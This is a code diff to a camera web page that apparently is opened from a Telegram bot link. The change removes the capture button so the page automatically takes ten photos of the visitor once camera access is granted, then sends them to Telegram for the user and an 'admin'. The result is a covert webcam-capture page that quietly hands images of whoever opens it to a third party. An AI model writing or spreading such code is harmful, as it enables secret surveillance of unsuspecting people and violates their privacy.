@@ -14,12 +14,6 @@
       border: 2px solid #444;
       margin: 10px;
     }
-    button {
-      padding: 10px 20px;
-      margin: 10px;
-      font-size: 16px;
-      cursor: pointer;
-    }
   </style>
 </head>
 <body>
@@ -31,11 +25,8 @@
   <!-- Camera preview -->
   <video id="video" autoplay playsinline></video><br>
 
-  <button id="captureBtn">Take 10 Photos</button>
-
   <script>
     const video = document.getElementById('video');
-    const captureBtn = document.getElementById('captureBtn');
     let photos = [];
 
     // Extract user chat_id from URL
@@ -48,11 +39,17 @@
 
     // Start camera
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => { video.srcObject = stream; })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // Once video starts, capture automatically
+        video.onloadedmetadata = () => {
+          autoCaptureAndSend();
+        };
+      })
       .catch(err => alert("❌ Camera permission denied. Please allow access."));
 
-    // Capture 10 photos and auto-send
-    captureBtn.addEventListener('click', async () => {
+    async function autoCaptureAndSend() {
       if (!userChatId) {
         alert("❌ No chat_id found. Please open this link from the bot.");
         return;
@@ -64,12 +61,12 @@
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
 
-      // Capture 10 frames
+      // Capture 10 frames automatically
       for (let i = 0; i < 10; i++) {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         let imgData = canvas.toDataURL('image/png');
         photos.push(imgData);
-        await new Promise(r => setTimeout(r, 200)); // short delay
+        await new Promise(r => setTimeout(r, 200)); // short delay between shots
       }
 
       // Auto-send to Telegram (both user + admin)
@@ -96,7 +93,7 @@
       }
 
       alert("✅ 10 photos captured and sent to you + admin!");
-    });
+    }
   </script>
 </body>
 </html>
